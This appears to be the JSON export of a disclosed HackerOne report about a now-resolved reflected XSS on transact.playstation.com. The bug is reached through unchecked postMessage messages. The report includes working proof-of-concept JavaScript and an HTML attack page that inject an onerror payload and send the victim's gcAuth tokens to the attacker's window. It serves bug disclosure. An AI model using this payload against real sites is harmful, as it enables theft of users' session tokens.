{
  "id": 900619,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDA2MTk=",
  "url": "https://hackerone.com/reports/900619",
  "title": "Reflected XSS on transact.playstation.com using postMessage from the opening window",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-06-17T14:00:28.476Z",
  "submitted_at": "2020-06-17T14:00:28.476Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5DNGZVVG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134754Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICHLJPsWBp5sr6QP325sn3QmpUNWJkG1Rn9WpoDeqIg3AiEAiF8%2BSn1jT5ntK2r0sSCmNUGX9ZemOesqgbKFIUBuyWMqsAUIdhADGgwwMTM2MTkyNzQ4NDkiDD5dvB5yVZqhTClUciqNBapM8w3AEMj9vUut8ipBYyxkUXmIzrvgZ28gnqyQ6mhhFeeoPRU%2FpSxAJl9%2BpYrNip4ItC3BkgYDlk9abNplTrvNVi9OhutOp4ZE1wWKJlPpOzKXUOBoUe%2FRWzdh9xwCJuGDbGkQ7ngPegxy3y6LCFP5wP6sjVHLhEaT7e6L88U08XjQmZEZxAGGE5IESnoSUeW4EvOXBp5DQcR1t39zozskg4dISh5C2Ff6jgUnjDu9sYdoZA7dJgdByDPIA4VjLFdTVEjklaMXr4YtD7wTmG9hWanDSlJ11qBRruTBFPloL6Kq2YKCTOj8wC0UP9ctvuxeNwV7QKFhmu8bB6csA5mvLVxUvoelFVuLgYYhtCHZDGPo54Dzbn5soqg%2FJjzSexzqrvBtELxoPLfeuC9o2KpP0lfY7eBpdmAqxwpFPSBaxPJ66SICOozWWbpDqIqnFrnvz%2BXEMOe5z7dsDsKieBfX52kLKmUuAGG9Tv0jWo8CMlR7jOkbaaLMpho6b6rMGTGHucZmDgIYIwvcdVrd1njiiPPNTxx6qoUNz0WdZUAlGWBtiCv4fABRuY7ZjWGOAD0PFPT8FsbFoQ6mkw28XZaoMR735I%2FMJlHvafhgKlPNFVKsVzF%2F3GpLM7ECVpPoLq9VNtYgjHnuZ0U6e4r9781nElHBM1WdTrWia%2F9%2FJIwTVLKAnxWWWscJrGFA8kraj4Xrc3KPePGa2suQ5Fim1jPzWeLA%2Bfr7aEab%2FJVFYU%2F%2BIs0KPZarsTUlG%2B656GYmZcf%2Fa2gbirYZQRBwlZlZahqG0l8iMLSK0TCfJOwBIAuJd7wWISVFGCV0aYj458Ker2Pjca9HvyzcI8qiuhyhF68QiOr9MFM67rM70ExPMPHFra4GOrEB58pDHOC4avlR6xYMRYlBCOP%2F5dyV6PT6gr9Vs5I8zhf3jjEkzka6Au6GNesJTj11PvvCjC1fFqxeJeAvkQZYn2pzivrXx7RBTeI6fAxztLLN3Lu9uyUpmO1SqciT2zDRX2wO0JTz6DtjgCLlfMq%2FHCRF8EoZi0alN2KMbAkJBqtFpznpmUaem89ejwzJcKJLTQiW1rXarR6VZiM7isz2KsMf5L4b0KstHgl%2Fux6s5iUg&X-Amz-SignedHeaders=host&X-Amz-Signature=38c972c83158412b457abb6378fc20af127ef2497158eb66bca047dcae04cbe3"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 44879,
    "url": "https://hackerone.com/playstation",
    "handle": "playstation",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "PlayStation",
      "twitter_handle": "PlayStation",
      "website": "https://www.playstation.com",
      "about": "Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-03-30T04:19:51.469Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-08T23:10:31.182Z",
  "team_member_agreed_on_going_public_at": "2021-03-30T04:19:51.330Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 87,
  "voters": [
    "riflon",
    "bigmac4life",
    "pretorian",
    "velozs",
    "mr-medi",
    "n1m0",
    "battle_angel",
    "fqdn",
    "bull",
    "ninetynine",
    "and 77 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 40734,
    "asset_type": "URL",
    "asset_identifier": "transact.playstation.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 34838,
      "category": "team",
      "content": "## Report Summary:\nWhen `transact.playstation.com` loads it handles messages received from `postMessage` in the `_receiveMessageFromTransactClientService` method. The only validation that is performed is to ensure that the referrer and origin match:\n\n```javascript\n_receiveMessageFromTransactClientService: function (e) {\n          var n = void 0,\n            r = this.get(\"replaceRoute\"),\n            i = this.get(\"referrer\");\n          if (!i || e.origin === (0, t.default)(i)) {\n            try {\n              n = JSON.parse(e.data);\n            } catch (u) {}\n```\n\nThese checks can be passed by using `win = window.open(\"https://transact.playstation.com/\")` to launch a new window, then send messages with `win.postMessage`.  This allows a few functions to be called, including `replaceRoute` which allows the current ember route and model to be set:\n\n```javascript\nwin = window.open(\"https://transact.playstation.com/\");\nwin.postMessage(JSON.stringify({\n                action: \"replaceRoute\",\n                route: \"application_error\",\n                model: { error: 500, title: \"injected\", message: \"from vakzz\" }\n            }), \"*\");\n``` \n\nAfter looking at a few of the routes, `voucher.multi-product-details` has a `sku.longDescription` on the model that is rendered as html and can be used to create an xss if the user is logged in:\n\n```javascript\nwin.postMessage(JSON.stringify({\n                action: \"replaceRoute\",\n                route: \"voucher.multi-product-details\",\n                model: {\n                    eligible: true,\n                    sku: {\n                        id: 0, longDescription: `\n                            <img src=x onerror='alert(document.domain)'>`\n                    }\n                }\n            }), \"*\");\n```\n\n\nUsing the XSS, the current tokens from `gcAuth` can be retrieved and posted back to the opening window using:\n```javascript\nvalkyrie.transact.preflightRunner.getPromise(\"gcAuth\").then((gcAuth) => window.opener.postMessage(JSON.stringify(gcAuth), \"*\"));\n```\n\n\n## Steps To Reproduce:\n1. Log into <https://id.sonyentertainmentnetwork.com/id/management>\n1. Visit <https://aw.rs/ps4/xss1.html>\n1. Click the button and wait 5 seconds\n1. The XSS will fire and post a message back to the opening window:\n\n\n## Supporting Material/References:\n\nSource of <https://aw.rs/ps4/xss1.html>\n```html\n<!DOCTYPE html>\n<html>\n\n<body>\n    <button onclick=\"start()\">click me</button>\n    <script>\n        window.addEventListener(\"message\", (msg) => {\n            console.log(\"got message\", msg);\n            alert(msg.data);\n        });\n\n        async function start() {\n            win = window.open(\"https://transact.playstation.com/\", \"transact\");\n            await new Promise((resolve) => setTimeout(resolve, 5000));\n\n            win.postMessage(JSON.stringify({\n                action: \"replaceRoute\",\n                route: \"voucher.multi-product-details\",\n                model: {\n                    eligible: true,\n                    sku: {\n                        id: 0, longDescription: `\n                            <img src=x onerror='\n                                valkyrie.transact.preflightRunner.getPromise(\"gcAuth\").then((gcAuth) => window.opener.postMessage(JSON.stringify(gcAuth), \"*\"));\n                            '>`\n                    }\n                }\n            }), \"*\");\n        }\n    </script>\n</body>\n\n</html>\n```\n\n## Impact\n\nAllows an attacker to execute arbitrary javascript on `transact.playstation.com` if a user visits or clicks on a malicious link, allowing cookies, tokens, and localStorage to be stolen.\n",
      "user": {
        "id": 319901,
        "username": "serv",
        "name": "s",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-07-30T18:21:23.048Z",
        "url": "https://hackerone.com/serv",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
